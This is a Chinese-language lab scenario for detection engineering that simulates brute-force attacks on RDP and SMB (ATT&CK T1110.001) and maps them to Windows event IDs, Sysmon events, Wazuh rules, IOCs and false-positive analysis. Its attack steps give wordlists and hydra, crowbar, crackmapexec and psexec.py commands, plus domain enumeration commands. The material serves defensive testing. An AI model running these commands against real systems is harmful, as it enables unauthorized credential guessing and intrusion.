# 场景1：暴力破解 (Brute Force)

## ATT&CK 映射

| 字段 | 值 |
|------|-----|
| 战术 | Credential Access (凭证获取) |
| 技术 | T1110.001 - Password Guessing (密码猜测) |
| 子技术 | 在线密码猜测，针对 RDP/SMB 服务 |

## 场景描述

攻击者从 Kali 攻击机对域内 Windows 终端的 RDP (3389) 和 SMB (445) 服务进行暴力破解，尝试弱口令字典。成功获取普通用户 jdoe 的凭证后，以该用户身份登录系统，建立初始立足点。

## 攻击拓扑

```
Kali (192.168.56.100)
    │
    │  RDP brute force (3389)
    │  SMB brute force (445)
    ▼
WIN10-01 (192.168.56.30)
    - 目标账号: jdoe
    - 正确密码: Winter2024!
```

## 检测要点

| 数据源 | Event ID | 检测逻辑 |
|--------|----------|----------|
| Windows 安全日志 | 4625 | 短时间内（5分钟）同一源 IP 产生大量登录失败（>10次） |
| Windows 安全日志 | 4624 | 登录失败后紧接着出现登录成功（同一账号、同一源IP） |
| Windows 安全日志 | 4625 + 4624 | 关联分析：失败→成功的模式识别 |
| Sysmon | 3 | 可疑源 IP 对 3389/445 端口的大量连接 |
| Wazuh | - | 内置规则 5710 (sshd 暴力破解) 的 Windows 等价规则 |

## 操作步骤

### 步骤1：准备密码字典

在 Kali 上创建针对目标用户的密码字典：

```bash
# 创建用户名字典
cat > users.txt << 'EOF'
administrator
jdoe
svc_sql
backup_admin
admin
test
guest
EOF

# 创建密码字典（包含正确密码 Winter2024!）
cat > passwords.txt << 'EOF'
password
Password1
P@ssw0rd
P@ssw0rd!
Winter2023
Winter2023!
Winter2024
Winter2024!
Summer2024!
Spring2024!
123456
12345678
qwerty
abc123
Password123
Welcome1
Welcome1!
Changeme123
EOF
```

### 步骤2：SMB 暴力破解（使用 hydra）

```bash
# SMB 暴力破解
hydra -L users.txt -P passwords.txt smb://192.168.56.30 -t 4 -vV

# 预期输出：找到 jdoe:Winter2024!
```

### 步骤3：RDP 暴力破解（使用 hydra 或 crowbar）

```bash
# 方法1：hydra RDP
hydra -L users.txt -P passwords.txt rdp://192.168.56.30 -t 2 -vV

# 方法2：crowbar（更稳定）
sudo apt install crowbar -y
crowbar -b rdp -s 192.168.56.30/32 -U users.txt -C passwords.txt -n 2
```

### 步骤4：使用破解的凭证登录

```bash
# 使用 crackmapexec 验证凭证
crackmapexec smb 192.168.56.30 -u jdoe -p 'Winter2024!'

# 使用 psexec 获得交互式 shell（可选）
psexec.py corp.local/jdoe:'Winter2024!'@192.168.56.30
```

### 步骤5：在目标主机上执行命令（模拟攻击者行为）

在 WIN10-01 上以 jdoe 登录后执行：

```powershell
# 枚举域用户
net user /domain

# 枚举域组
net group "Domain Admins" /domain

# 查看本地管理员
net localgroup Administrators

# 查看网络共享
net view \\DC01
```

## 预期日志与告警

### Windows 安全日志（WIN10-01）

| Event ID | 数量 | 说明 |
|----------|------|------|
| 4625 | 20-40 | 登录失败事件（每个错误密码一次） |
| 4624 | 1+ | 登录成功事件（jdoe 登录） |
| 4672 | 1 | 特权登录（如果 jdoe 是本地管理员） |

### Sysmon 日志（WIN10-01）

| Event ID | 说明 |
|----------|------|
| 3 | 来自 192.168.56.100 的大量 445/3389 连接 |
| 1 | jdoe 登录后启动的 powershell.exe / cmd.exe |

### Wazuh 告警

- 规则 ID 18106：Windows 登录失败多次
- 规则 ID 18107：Windows 暴力破解尝试
- 自定义规则：登录失败后成功登录

## IOC（失陷指标）

| 类型 | 值 |
|------|-----|
| 源 IP | 192.168.56.100 (Kali) |
| 目标端口 | 445 (SMB), 3389 (RDP) |
| 被攻击账号 | jdoe, administrator, svc_sql |
| 成功账号 | jdoe |
| 攻击工具 | hydra, crackmapexec, psexec.py |

## 误报分析

- 管理员输错密码：通常 1-3 次失败后成功，不会在短时间内尝试数十个不同密码
- 服务账号密码过期：会有规律的失败，但源 IP 固定为服务所在主机
- 监控系统探测：可能产生登录失败，但通常使用特定账号且频率稳定
